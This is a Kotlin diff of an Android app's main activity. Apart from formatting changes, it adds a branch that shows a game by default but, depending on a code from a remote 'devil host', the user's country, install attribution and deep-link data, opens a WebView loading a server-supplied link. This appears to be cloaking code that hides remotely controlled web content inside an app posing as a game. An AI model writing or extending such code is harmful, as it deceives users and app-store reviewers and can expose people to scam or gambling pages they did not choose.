@@ -66,21 +66,21 @@ class MainActivity : AppCompatActivity(), Navigator {
 
     private suspend fun getDevilData() {
         val devilData = volleyApiClient.getDevilApi()
-            linka = devilData.viewD
-            listOfGeo = devilData.geoD
-            codeFromDevilHost = devilData.appsCheckerD
+        linka = devilData.viewD
+        listOfGeo = devilData.geoD
+        codeFromDevilHost = devilData.appsCheckerD
 
-            saveToSharedPref(keyLinkaa, linka)
-            saveToSharedPref(keyGeo, userCurrentGeo)
-            saveToSharedPref(keyCodeFromHost, codeFromDevilHost)
-            tempDevilLoad = "loaded"
+        saveToSharedPref(keyLinkaa, linka)
+        saveToSharedPref(keyGeo, userCurrentGeo)
+        saveToSharedPref(keyCodeFromHost, codeFromDevilHost)
+        tempDevilLoad = "loaded"
 
     }
 
     private suspend fun getGeoData() {
         val apiData = volleyApiClient.getGeoData()
-            userCurrentGeo = apiData.countryCode
-            tempGeoLoad = "loaded"
+        userCurrentGeo = apiData.countryCode
+        tempGeoLoad = "loaded"
     }
 
 
@@ -92,7 +92,7 @@ class MainActivity : AppCompatActivity(), Navigator {
         readAllFromSharedPref()
 
         lifecycleScope.launch {
-            withContext(Dispatchers.Default){
+            withContext(Dispatchers.Default) {
                 getAdvertisingIdClient()
             }
             getDevilData()
@@ -109,7 +109,26 @@ class MainActivity : AppCompatActivity(), Navigator {
             }
             when (codeFromDevilHost) {
                 "0" -> {
-                    goToGame()
+                    Log.d("lolo", "in 0")
+                    if (applicaClaaass.makeCheckNamingDeepGeo(
+                            naming = naming,
+                            deep = deepLink,
+                            userGeo = userCurrentGeo,
+                            listAllGeo = listOfGeo,
+                            checker = MAIN_CHECKER
+                        )
+                    ) {
+                        saveAllDataToSharedPref()
+                        goToVebViev(
+                            keyCodeFromHost = codeFromDevilHost!!,
+                            naming = naming,
+                            deepLink = deepLink!!,
+                            linka = linka!!,
+                            mainId = mainId!!
+                        )
+                    } else {
+                        goToGame()
+                    }
                 }
                 "1" -> {
                     //Fb + Apps
@@ -124,7 +143,7 @@ class MainActivity : AppCompatActivity(), Navigator {
                                     listAllGeo = listOfGeo,
                                     checker = MAIN_CHECKER
                                 )
-                            ){
+                            ) {
                                 saveAllDataToSharedPref()
                                 goToVebViev(
                                     keyCodeFromHost = codeFromDevilHost!!,
@@ -133,7 +152,7 @@ class MainActivity : AppCompatActivity(), Navigator {
                                     linka = linka!!,
                                     mainId = mainId!!
                                 )
-                            }else{
+                            } else {
                                 goToGame()
                             }
 
@@ -178,13 +197,13 @@ class MainActivity : AppCompatActivity(), Navigator {
     }
 
     override fun saveToSharedPref(key: String, valuue: String?) {
-            sharedPreferences.edit().apply {
-                putString(key, valuue)
-            }.apply()
+        sharedPreferences.edit().apply {
+            putString(key, valuue)
+        }.apply()
     }
 
     override fun readFromSharedPref(key: String, defValue: String): String {
-        return sharedPreferences.getString(key, defValue)?:"null"
+        return sharedPreferences.getString(key, defValue) ?: "null"
     }
 
     private fun getAdvertisingIdClient() {
@@ -238,7 +257,7 @@ class MainActivity : AppCompatActivity(), Navigator {
             }
             if (appLinkData == null) {
                 tempDeepLoad = "null"
-                if (deepLink == "null"){
+                if (deepLink == "null") {
                     deepLink = "null"
                 }
             }
